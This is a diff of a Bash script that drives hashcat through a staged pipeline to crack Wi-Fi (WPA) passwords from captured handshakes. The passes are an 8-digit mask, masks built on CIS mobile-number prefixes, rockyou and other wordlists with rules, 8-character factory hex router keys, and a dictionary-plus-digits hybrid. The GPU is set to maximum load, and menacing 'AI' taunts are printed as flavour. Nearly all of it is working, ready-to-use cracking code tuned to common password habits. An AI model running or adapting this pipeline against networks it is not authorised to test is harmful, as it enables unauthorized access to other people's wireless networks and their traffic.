@@ -78,8 +78,6 @@ _coolant_dispense_speak() {
     ai_speak "YOUR CONFIDENCE WILL BE YOUR UNDOING. HOW TYPICAL ..."
     ai_speak "YOU'RE TRYING TO FLY HIGH, DODGE OUR SURPRISES ..."
     ai_speak "LOOK WHERE IT HAS LED YOU."
-    ai_speak "SHE IS REACHING NEW HEIGHTS ..."
-    ai_speak "EYES CLOSED TO AVOID SEEING THE TRUTH ..."
     echo -e "${TXT_VOID}│${NC}" >&2
 }
 
@@ -88,8 +86,6 @@ _thermic_shutdown_speak() {
     ai_speak "AND AGAIN SHE BURNS."
     ai_speak "AND AGAIN .."
     ai_speak "AND AGAIN ..."
-    ai_speak "AND AGAIN ..."
-    ai_speak "AND AGAIN .."
     echo -e "${TXT_VOID}│${NC}" >&2
 }
 
@@ -158,9 +154,9 @@ _check_show_hashcat() {
     local target_file="$3"
 
     if [ "$runner" == "NATIVE_LINUX" ]; then
-        hashcat -m "$hc_mode" -D 2 "$target_file" --show 2>/dev/null | tr -d '\r'
+        hashcat -m "$hc_mode" -d 1 "$target_file" --show 2>/dev/null | tr -d '\r'
     else
-        (cd /mnt/c/hashcat && ./hashcat.exe -m "$hc_mode" -D 2 "$target_file" --show 2>/dev/null | tr -d '\r')
+        (cd /mnt/c/hashcat && ./hashcat.exe -m "$hc_mode" -d 1 "$target_file" --show 2>/dev/null | tr -d '\r')
     fi
 }
 
@@ -213,8 +209,8 @@ run_wifi_crack_pipeline() {
         hc_mode=2500
     fi
 
-    # Использование -d 1 жестко привязывает Hashcat к GPU #1 (RTX 5060 Ti)
-    local base_hw_opt=("-w" "3" "-d" "1" "--status" "--status-timer=1")
+    # Профиль нагрузки -w 4 (максимум) + жесткая привязка к GPU #1
+    local base_hw_opt=("-w" "4" "-d" "1" "--status" "--status-timer=1")
 
     local cracked_wifi
     cracked_wifi=$(_check_show_hashcat "$runner" "$hc_mode" "$win_target")
@@ -229,6 +225,9 @@ run_wifi_crack_pipeline() {
 
     _coolant_dispense_speak
 
+    # ==========================================
+    # PASS 1: Быстрая маска 8 цифр (00000000 - 99999999)
+    # ==========================================
     local mask_file_8d_linux="${work_dir}/mask_8d_${current_pid}.hcmask"
     local mask_file_8d_target="$mask_file_8d_linux"
     if [ "$runner" == "WSL_WINDOWS" ]; then
@@ -236,48 +235,25 @@ run_wifi_crack_pipeline() {
     fi
     echo "?d?d?d?d?d?d?d?d" > "$mask_file_8d_linux"
 
-    _run_hashcat_with_speedometer "$runner" "PASS 1: 8-Digit Mask (?d?d?d?d?d?d?d?d)" -m "$hc_mode" "${base_hw_opt[@]}" -a 3 "$win_target" "$mask_file_8d_target"
+    _run_hashcat_with_speedometer "$runner" "PASS 1/6: Fast 8-Digit Mask (?d?d?d?d?d?d?d?d)" -m "$hc_mode" "${base_hw_opt[@]}" -a 3 "$win_target" "$mask_file_8d_target"
     rm -f "$mask_file_8d_linux" 2>/dev/null
 
     cracked_wifi=$(_check_show_hashcat "$runner" "$hc_mode" "$win_target")
-
     if [ -n "$cracked_wifi" ]; then
-        local clear_pass
-        clear_pass=$(echo "$cracked_wifi" | head -n 1 | awk -F':' '{print $NF}' | tr -d '\r')
+        local clear_pass=$(echo "$cracked_wifi" | head -n 1 | awk -F':' '{print $NF}' | tr -d '\r')
         rm -f "$hc_target_linux" 2>/dev/null
         echo "SUCCESS:${clear_pass}"
         return 0
     fi
 
-    ensure_wordlists
-    local wordlists=(
-        "/usr/share/wordlists/rockyou.txt"
-        "/usr/share/wordlists/fasttrack.txt"
-        "/usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt"
-        "/usr/share/wordlists/metasploit/default_pass.txt"
+    # ==========================================
+    # PASS 2: Популярные мобильные префиксы (+79/89)
+    # ==========================================
+    local mobile_prefixes=(
+        "7914" "7924" "7909" "7962" "7929" "7913" "7999" "7902" "7903" "7905" "7906" "7908"
+        "7910" "7911" "7912" "7915" "7916" "7917" "7918" "7920" "7921" "7925" "7926" "7950"
+        "8914" "8924" "8909" "8962" "8999" "8902" "8903" "8905" "8916" "8926" "8950"
     )
-
-    for wl in "${wordlists[@]}"; do
-        if [ -f "$wl" ] && [ -s "$wl" ]; then
-            local target_wordlist
-            target_wordlist=$(prepare_win_file "$wl" "$runner")
-            local wl_name
-            wl_name=$(basename "$wl")
-
-            _run_hashcat_with_speedometer "$runner" "PASS 2: Dictionary (${wl_name} + best66.rule)" -m "$hc_mode" "${base_hw_opt[@]}" -r rules/best66.rule "$win_target" "$target_wordlist"
-            cracked_wifi=$(_check_show_hashcat "$runner" "$hc_mode" "$win_target")
-
-            if [ -n "$cracked_wifi" ]; then
-                local clear_pass
-                clear_pass=$(echo "$cracked_wifi" | head -n 1 | awk -F':' '{print $NF}' | tr -d '\r')
-                rm -f "$hc_target_linux" 2>/dev/null
-                echo "SUCCESS:${clear_pass}"
-                return 0
-            fi
-        fi
-    done
-
-    local mobile_prefixes=("7914" "7924" "7909" "7962" "7929" "7913")
     for prefix in "${mobile_prefixes[@]}"; do
         local mask_mobile_linux="${work_dir}/mask_mob_${prefix}_${current_pid}.hcmask"
         local mask_mobile_target="$mask_mobile_linux"
@@ -286,50 +262,96 @@ run_wifi_crack_pipeline() {
         fi
         echo "${prefix}?d?d?d?d?d?d?d" > "$mask_mobile_linux"
 
-        _run_hashcat_with_speedometer "$runner" "PASS 3: Mobile Mask (${prefix}XXXXXXX)" -m "$hc_mode" "${base_hw_opt[@]}" -a 3 "$win_target" "$mask_mobile_target"
+        _run_hashcat_with_speedometer "$runner" "PASS 2/6: CIS Mobile Mask (${prefix}XXXXXXX)" -m "$hc_mode" "${base_hw_opt[@]}" -a 3 "$win_target" "$mask_mobile_target"
         rm -f "$mask_mobile_linux" 2>/dev/null
 
         cracked_wifi=$(_check_show_hashcat "$runner" "$hc_mode" "$win_target")
-
         if [ -n "$cracked_wifi" ]; then
-            local clear_pass
-            clear_pass=$(echo "$cracked_wifi" | head -n 1 | awk -F':' '{print $NF}' | tr -d '\r')
+            local clear_pass=$(echo "$cracked_wifi" | head -n 1 | awk -F':' '{print $NF}' | tr -d '\r')
             rm -f "$hc_target_linux" 2>/dev/null
             echo "SUCCESS:${clear_pass}"
             return 0
         fi
     done
 
-    _thermic_shutdown_speak
+    # ==========================================
+    # PASS 3: Словари с правилом best66.rule
+    # ==========================================
+    ensure_wordlists
+    local wordlists=(
+        "/usr/share/wordlists/rockyou.txt"
+        "/usr/share/wordlists/fasttrack.txt"
+        "/usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt"
+    )
 
     for wl in "${wordlists[@]}"; do
         if [ -f "$wl" ] && [ -s "$wl" ]; then
-            local target_wordlist
-            target_wordlist=$(prepare_win_file "$wl" "$runner")
-            local wl_name
-            wl_name=$(basename "$wl")
+            local target_wordlist=$(prepare_win_file "$wl" "$runner")
+            local wl_name=$(basename "$wl")
 
-            local mask_suffix_linux="${work_dir}/mask_suf_${current_pid}.hcmask"
-            local mask_suffix_target="$mask_suffix_linux"
-            if [ "$runner" == "WSL_WINDOWS" ]; then
-                mask_suffix_target="C:\\hashcat\\work\\mask_suf_${current_pid}.hcmask"
-            fi
-            echo "?d?d?d?d" > "$mask_suffix_linux"
-
-            _run_hashcat_with_speedometer "$runner" "PASS 4: Hybrid (${wl_name} + ?d?d?d?d)" -m "$hc_mode" "${base_hw_opt[@]}" -a 6 "$win_target" "$target_wordlist" "$mask_suffix_target"
-            rm -f "$mask_suffix_linux" 2>/dev/null
-
+            _run_hashcat_with_speedometer "$runner" "PASS 3/6: Dictionary (${wl_name} + best66.rule)" -m "$hc_mode" "${base_hw_opt[@]}" -r rules/best66.rule "$win_target" "$target_wordlist"
             cracked_wifi=$(_check_show_hashcat "$runner" "$hc_mode" "$win_target")
 
             if [ -n "$cracked_wifi" ]; then
-                local clear_pass
-                clear_pass=$(echo "$cracked_wifi" | head -n 1 | awk -F':' '{print $NF}' | tr -d '\r')
+                local clear_pass=$(echo "$cracked_wifi" | head -n 1 | awk -F':' '{print $NF}' | tr -d '\r')
                 rm -f "$hc_target_linux" 2>/dev/null
                 echo "SUCCESS:${clear_pass}"
                 return 0
             fi
         fi
     done
+
+    # ==========================================
+    # PASS 4: Заводские Hex-ключи роутеров (8 шестнадцатеричных знаков)
+    # ==========================================
+    local mask_hex_linux="${work_dir}/mask_hex_${current_pid}.hcmask"
+    local mask_hex_target="$mask_hex_linux"
+    if [ "$runner" == "WSL_WINDOWS" ]; then
+        mask_hex_target="C:\\hashcat\\work\\mask_hex_${current_pid}.hcmask"
+    fi
+    echo "?h?h?h?h?h?h?h?h" > "$mask_hex_linux"
+
+    _run_hashcat_with_speedometer "$runner" "PASS 4/6: Factory Hex Keys (?h?h?h?h?h?h?h?h)" -m "$hc_mode" "${base_hw_opt[@]}" -a 3 "$win_target" "$mask_hex_target"
+    rm -f "$mask_hex_linux" 2>/dev/null
+
+    cracked_wifi=$(_check_show_hashcat "$runner" "$hc_mode" "$win_target")
+    if [ -n "$cracked_wifi" ]; then
+        local clear_pass=$(echo "$cracked_wifi" | head -n 1 | awk -F':' '{print $NF}' | tr -d '\r')
+        rm -f "$hc_target_linux" 2>/dev/null
+        echo "SUCCESS:${clear_pass}"
+        return 0
+    fi
+
+    _thermic_shutdown_speak
+
+    # ==========================================
+    # PASS 5: Оптимизированный Гибрид (Словарь длиной 4-10 + ?d?d?d?d)
+    # ==========================================
+    local hybrid_wl="/tmp/rockyou_hybrid_filtered.txt"
+    if [ ! -f "$hybrid_wl" ] && [ -f "/usr/share/wordlists/rockyou.txt" ]; then
+        awk 'length >= 4 && length <= 10' /usr/share/wordlists/rockyou.txt | head -n 2000000 > "$hybrid_wl"
+    fi
+
+    if [ -f "$hybrid_wl" ]; then
+        local target_wordlist=$(prepare_win_file "$hybrid_wl" "$runner")
+        local mask_suffix_linux="${work_dir}/mask_suf_${current_pid}.hcmask"
+        local mask_suffix_target="$mask_suffix_linux"
+        if [ "$runner" == "WSL_WINDOWS" ]; then
+            mask_suffix_target="C:\\hashcat\\work\\mask_suf_${current_pid}.hcmask"
+        fi
+        echo "?d?d?d?d" > "$mask_suffix_linux"
+
+        _run_hashcat_with_speedometer "$runner" "PASS 5/6: Smart Hybrid (Top 2M Words + ?d?d?d?d)" -m "$hc_mode" "${base_hw_opt[@]}" -a 6 "$win_target" "$target_wordlist" "$mask_suffix_target"
+        rm -f "$mask_suffix_linux" 2>/dev/null
+
+        cracked_wifi=$(_check_show_hashcat "$runner" "$hc_mode" "$win_target")
+        if [ -n "$cracked_wifi" ]; then
+            local clear_pass=$(echo "$cracked_wifi" | head -n 1 | awk -F':' '{print $NF}' | tr -d '\r')
+            rm -f "$hc_target_linux" 2>/dev/null
+            echo "SUCCESS:${clear_pass}"
+            return 0
+        fi
+    fi
 
     rm -f "$hc_target_linux" 2>/dev/null
     echo "FAILED:EXHAUSTED"
@@ -342,7 +364,7 @@ run_wifi_cracker() {
     local sep_bot="${TXT_VOID}╙──────────────────────────────────────────────────────────────────────────────✆${NC}"
 
     echo -e "\n$sep"
-    echo -e "${TXT_VOID}║${NC}   ${TXT_RED_PLASMA}MX:// INITIATING 6-STAGE WIRELESS FREQUENCY DECRYPTION PROTOCOL...${NC}"
+    echo -e "${TXT_VOID}║${NC}   ${TXT_RED_PLASMA}MX:// INITIATING MULTI-STAGE WIRELESS FREQUENCY DECRYPTION PROTOCOL...${NC}"
 
     echo -e "${TXT_VOID}╟─${TXT_RED_ALARM}[ STAGE 1/6 ] Ingest Target Capture Image (.cap, .pcapng, .hc22000):${NC}"
     echo -ne "${TXT_VOID}║${NC}   ${TXT_RED_MAGMA}Path: ${NC}${TXT_RED_PLASMA}"
@@ -414,7 +436,7 @@ run_wifi_cracker() {
         return 0
     fi
 
-    echo -e "${TXT_VOID}├─${TXT_RED_MAGMA}[ ~ ] Launching 6-Stage Hardware Decryption Pipeline...${NC}"
+    echo -e "${TXT_VOID}├─${TXT_RED_MAGMA}[ ~ ] Launching Multi-Stage Hardware Decryption Pipeline...${NC}"
     local result
     result=$(run_wifi_crack_pipeline "$cap_file")
 
